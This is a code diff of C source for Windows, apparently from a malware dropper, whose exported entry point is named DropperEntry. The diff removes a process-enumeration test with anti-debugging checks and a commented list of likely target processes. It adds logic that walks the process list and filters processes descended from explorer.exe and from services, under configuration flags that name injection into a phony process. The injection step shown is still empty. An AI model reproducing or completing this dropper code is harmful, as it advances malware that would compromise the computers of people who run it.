@@ -3,69 +3,6 @@
 #include <fnv1a.h>
 #include <random.h>
 
-#if 1
-    enum {
-        #ifdef _AMD64_
-            DummyProcessSum = 0x99A5C4B4, // DummyProcessx64.exe
-        #else
-            DummyProcessSum = 0xFE68627C, // DummyProcessx86.exe
-        #endif
-
-        DummyProcessLength = 38
-    };
-
-
-    static
-    VOID
-    DECLSPEC_NOINLINE
-    EnumProcessTest(VOID)
-    {
-        NTSTATUS Status;
-        SIZE_T cbProcessInformation = 0;
-        PSYSTEM_PROCESS_INFORMATION ProcessInformation = NULL;
- 
-        if (RtlpGetPeb()->BeingDebugged) { __debugbreak(); }
-
-        NtQuerySystemInformation(SystemProcessInformation, NULL, 0, (PVOID)&cbProcessInformation);
-
-        if (!cbProcessInformation) {
-            $DLOG1(DLG_FLT_CRITICAL, "cbProcessInformation = 0");
-
-            return;
-        }
- 
-        if (!NT_SUCCESS(Status = NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID)&ProcessInformation, 0, &cbProcessInformation, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
-            $DLOG1(DLG_FLT_CRITICAL, "NtAllocateVirtualMemory %08lX", Status);
-
-            return;
-        }
-
-        $DLOG1(DLG_FLT_HIGHLIGHT, "%p", ProcessInformation);
-
-        if (RtlpGetPeb()->BeingDebugged) { __debugbreak(); }
-
-        if (!NT_SUCCESS(Status = NtQuerySystemInformation(SystemProcessInformation, (PVOID)ProcessInformation, cbProcessInformation, (PVOID)&cbProcessInformation))) {
-            $DLOG1(DLG_FLT_CRITICAL, "NtQuerySystemInformation %08lX", Status);
-
-            return;
-        }
-
-        for (; ProcessInformation->NextEntryOffset; ProcessInformation = (PVOID)((ULONG_PTR)ProcessInformation + ProcessInformation->NextEntryOffset)) {
-            DWORD dwSumName = 0;
-
-            if (ProcessInformation->ImageName.Length) {
-                dwSumName = Fnv1AHashStringW(ProcessInformation->ImageName.Buffer);
-            }
-
-            #ifdef _AMD64_
-                $DLOG1(DLG_FLT_HIGHLIGHT, "% 5I64u %08lX %lu %ls", ProcessInformation->UniqueProcessId, dwSumName, ProcessInformation->ImageName.Length, ProcessInformation->ImageName.Buffer);
-            #else
-                $DLOG1(DLG_FLT_HIGHLIGHT, "% 5lu %08lX %lu: %ls", ProcessInformation->UniqueProcessId, dwSumName, ProcessInformation->ImageName.Length, ProcessInformation->ImageName.Buffer);
-            #endif
-        }
-    }
-#endif
-
 VOID
 DECLSPEC_DLLEXPORT
 DropperEntry(VOID)
@@ -86,24 +23,64 @@ DropperEntry(VOID)
         return;
     }
 
-    #if 1
-        EnumProcessTest();
-    #endif
+    PSYSTEM_PROCESS_INFORMATION ProcessesList;
 
-/*
-    explorer.exe
-    MicrosoftEdge.exe
-    MicrosoftEdgeSH.exe
-    MicrosoftEdgeCP.exe
-    WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe
-    SkypeApp.exe
-    OneDrive.exe (Only x32, check on x64 if its x64)
-    MSASCuiL.exe
-    WinStore.App.exe
-    SearchUI.exe
-    SystemSettings.exe
-    WindowsCamera.exe
-    ShellExperienceHost.exe /?
-    MessagingApplication.exe
-*/
+    if (LdrQueryAllProcesses(&ProcessesList)) {
+        #if SCFG_DROPPER_PROCESSQUERY_INJECT_TO_PHONY == ON
+            for (PSYSTEM_PROCESS_INFORMATION ProcessIndex = ProcessesList; ProcessIndex->NextEntryOffset; ProcessIndex = (PVOID)((ULONG_PTR)ProcessIndex + ProcessIndex->NextEntryOffset)) {
+                #ifdef _AMD64_
+                    WCHAR szDummyName[] = L"DummyProcessx64.exe";
+                #else
+                    WCHAR szDummyName[] = L"DummyProcessx86.exe";
+                #endif
+                
+                if (RtlpCompareUnicodeNZ(ProcessIndex->ImageName.Buffer, szDummyName, sizeof(szDummyName))) {
+                
+                }
+            }
+        #else
+            PROCESSESFILTER Filter;
+            QWORD qwTimeDenominator = SCFG_DROPPER_PROCESSQUERY_TIME_DENOMINATOR;
+
+            if (LdrCreateOptimalProcessFilter(ProcessesList, &Filter)) {
+                for (ULONG_PTR i = 0; i != SCFG_DROPPER_PROCESSQUERY_TRIES; i++) {
+                    $DLOG2(DLG_FLT_DEFAULT, "qwTimeDenominator = %I64lu", qwTimeDenominator);
+
+                    for (PSYSTEM_PROCESS_INFORMATION ProcessIndex = ProcessesList; ProcessIndex->NextEntryOffset; ProcessIndex = (PVOID)((ULONG_PTR)ProcessIndex + ProcessIndex->NextEntryOffset)) {
+                        if (!ProcessIndex->UniqueProcessId || (QWORD)ProcessIndex->CreateTime.QuadPart / qwTimeDenominator > Filter.qwExplorerStartTime / qwTimeDenominator) {
+                            continue;
+                        }
+
+                        if (ProcessIndex->UniqueProcessId == Filter.ExplorerPid || ProcessIndex->InheritedFromUniqueProcessId == Filter.ExplorerPid) {
+                            #if SCFG_DROPPER_PROCESSQUERY_PRINT_QUERY == ON
+                                $DLOG1(DLG_FLT_DEFAULT, "    %p -> %p %ls", ProcessIndex->InheritedFromUniqueProcessId, ProcessIndex->UniqueProcessId, ProcessIndex->ImageName.Buffer);
+                            #endif
+
+                            ProcessIndex->UniqueProcessId = 0;
+                        } else if (ProcessIndex->InheritedFromUniqueProcessId != Filter.ServicePid) {
+                            for (PSYSTEM_PROCESS_INFORMATION ServicesIndex = ProcessesList; ServicesIndex->NextEntryOffset; ServicesIndex = (PVOID)((ULONG_PTR)ServicesIndex + ServicesIndex->NextEntryOffset)) {
+                                if (ServicesIndex->InheritedFromUniqueProcessId == Filter.ServicePid) { // svchost.exe
+                                    if (ProcessIndex->InheritedFromUniqueProcessId == ServicesIndex->UniqueProcessId) {
+                                        #if SCFG_DROPPER_PROCESSQUERY_PRINT_QUERY == ON
+                                            $DLOG1(DLG_FLT_DEFAULT, "    %p -> %p %ls", ProcessIndex->InheritedFromUniqueProcessId, ProcessIndex->UniqueProcessId, ProcessIndex->ImageName.Buffer);
+                                        #endif
+
+                                        ProcessIndex->UniqueProcessId = 0;
+                                    }
+                                }
+                            }
+                        }
+                    }
+
+                    qwTimeDenominator <<= SCFG_DROPPER_PROCESSQUERY_TIME_SHIFT_ON_FAIL;
+
+                    if (i == SCFG_DROPPER_PROCESSQUERY_TRIES - 1) {
+                        $DLOG1(DLG_FLT_CRITICAL, "Failed!");
+                    } else {
+                        $DLOG1(DLG_FLT_ERROR, "Increasing time denominator!");
+                    }
+                }
+            }
+        #endif
+    }
 }
